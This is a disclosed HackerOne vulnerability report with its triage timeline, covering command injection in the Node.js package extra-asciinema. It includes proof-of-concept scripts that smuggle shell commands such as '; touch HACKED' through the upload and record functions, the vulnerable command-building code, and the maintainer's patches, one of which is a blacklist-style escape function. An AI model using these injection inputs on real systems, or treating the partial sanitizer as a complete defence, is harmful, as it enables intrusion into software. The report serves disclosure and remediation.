---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2020-08-22
submitted: 2020-05-01T11:39:52.991Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/863956"
title: "[extra-asciinema] Command Injection via insecure command formatting"
---
# [extra-asciinema] Command Injection via insecure command formatting

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-22

- Report: [https://hackerone.com/reports/863956](https://hackerone.com/reports/863956)
- CWE: Command Injection - Generic
- Submitted: 2020-05-01T11:39:52.991Z

## Timeline

- **Report Filed**
- **2020-05-01** @celt: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@celt
- **Report Triaged**
- **External User Joined**
- **2020-07-24** @wolfram77: Used `execFile` for this one too. No more `HACKED` file.

https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480

```bash
> var asciinema = require('./')
undefined
> asciinema.uploadSync('; touch HACKED');
asciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'
Uncaught Error: Command failed: asciinema upload ; touch HACKED
asciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'

    at checkExecSyncError (child_process.js:616:11)
    at Object.execFileSync (child_process.js:634:15)
    at Object.uploadSync (/home/wolfram/Documents/extra-asciinema/index.js:142:21) {
  status: 1,
  signal: null,
  output: [
    null,
    '',
    "\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\x1B[0m\n"
  ],
  pid: 68455,
  stdout: '',
  stderr: "\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\x1B[0m\n"
}
```
- **2020-07-25** @bbe8482aecd24374d13c5de15a0a6: Hi @wolfram77, thanks for providing a new version which seems to fix this vulnerability.

Can you confirm that this resolves it @d3lla?
- **2020-07-26** @d3lla: Hi @danielruf and @wolfram77,
thanks for your reply and for the fix.

When I reported the issue I tested only the `uploadSync` function that now seems to be fixed.
I run the previous poc:
```javascript
const asciinema = require('extra-asciinema');
asciinema.uploadSync('; touch HACKED');
```
and indeed I was not able to reproduce the previous reported result.

However, now I tested also the other functions and it's still possible to inject arbitrary commands.
In particular I tested also the `asciinema.recSync` and `asciinema.rec` functions.
Here is the `poc2.js` I used:
```javascript
const asciinema = require('extra-asciinema');
// asciinema.uploadSync('; touch HACKED');'; touch HACKED

asciinema.recSync('saved.cast', {input: '"; touch HACKED1"'});
asciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});
asciinema.rec('saved.cast', {input: '`touch HACKED3`'});
asciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});

```

I think this is a corner case, because reading the documentation of `asciinema` (https://asciinema.org/docs/usage), it accepts a parameter called `command` that is the "command to record".

In this case the property `command` is build using the `o.input` parameter:
```javascript
// https://github.com/nodef/extra-asciinema/blob/master/src/_recCmd.ts#L9

import * as path from 'path';

function recCmd(f: string, o: any=null): string[] {
  var o = o||{};
  // if input file given, execute on node.js
  if(o.input) {
    var dir = path.dirname(o.input);
    var fil = path.basename(o.input);
    o.command = `cd ${dir} && cat "${fil}" | node -i`; // <-- HERE
  }
  o.overwrite = true;
  o.yes = true;
  var args = ['rec'];
  ...
  if(o.command) args.push('--command', o.command);
  ...
  return args;
}
export default recCmd;

// https://github.com/nodef/extra-asciinema/blob/master/src/rec.ts#L26
function rec(f: string=null, o: RecOptions=null, fn: callbackFn=null): Promise<any> {
  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');
  var p = new Promise((fres, frej) => {
    cp.execFile('asciinema', recCmd(f, o), {encoding: 'utf8'}, (err) => {
      if(err) return frej(err);
      fres(f);
    });
  });
  return p? p.then(a => fn(null, a), fn) : p;
}
export default rec;

// https://github.com/nodef/extra-asciinema/blob/master/src/recSync.ts#L24
function recSync(f: string, o: RecOptions=null): string {
  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');
  cp.execFileSync('asciinema', recCmd(f, o), {encoding: 'utf8'});
  return f;
}
export default recSync;
```

If `o.input` is `"; touch HACKED1"`, the `o.command` will be `cd . && cat ""; touch HACKED1"" | node -i`, while
if `o.input` is ``./`touch HACKED3`/../``,  the `o.command` will be ``'cd ./`touch HACKED3` && cat ".." | node -i``.

In this case, since you are calling the `cd` and `cat` commands (in the first case you need a directory while in the second case a filename), in my opinion, it is better to sanitize the value of `o.input` in order to avoid the above issues.

I attached a poc video.
{F923982}

@danielruf and @wolfram77 please let me know what do you think about that.

Some resources that could be helpful:
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b

A possible solution could be similar to this one (it's just a suggestion, feel free to choose what whatever you think best):
- https://github.com/418sec/node-git-wrapper/pull/3/files

```javascript
var escapeSpecialChars = function(cmd) {
    return cmd.replace(/([`$&{}[;|])/g,'');
}
function recCmd(f, o = null) {
    var o = o || {};
    
    if (o.input) {
        
        var dir = path.dirname(escapeSpecialChars(o.input));
        var fil = path.basename(escapeSpecialChars(o.input));
        o.command = `cd ${dir} && cat "${fil}" | node -i`;
    }
    ...
```



Thank you for your time,
d3lla


I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **2020-07-26** @wolfram77: I managed to not put the change in 1 commit, so i put the changed code here. Also in your POC video i noticed a `fn is not defined` error. Null check was on the wrong variable. Also changed that. Now when i run your POC, no `HACKED` file is created.

```javascript
function escapePath(p) {
  return p.replace(/[`$&{}[;|]/g, '');
}

function recCmd(f: string, o: any=null): string[] {
  var o = o||{};
  // if input file given, execute on node.js
  if(o.input) {
    var pth = escapePath(o.input);
    var dir = path.dirname(pth);
    var fil = path.basename(pth);
    o.command = `cd "${dir}" && cat "${fil}" | node -i`;
  }
```
- **2020-08-20** @wolfram77: @d3lla i think this should be fixed too. you can mark it as done.
- **2020-08-21** @d3lla: Hi @wolfram77,

sorry for the late reply.

Your changes seems to fix the problem.
I run the previous poc:

```javascript
const asciinema = require('extra-asciinema');
// asciinema.uploadSync('; touch HACKED');'; touch HACKED

asciinema.recSync('saved.cast', {input: '"; touch HACKED1"'});
asciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});
asciinema.rec('saved.cast', {input: '`touch HACKED3`'});
asciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});

```
and I was not able to reproduce the previous reported result.

I attached a PoC video.
{F958366}

Thanks for your time and have a nice day,
d3lla

I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
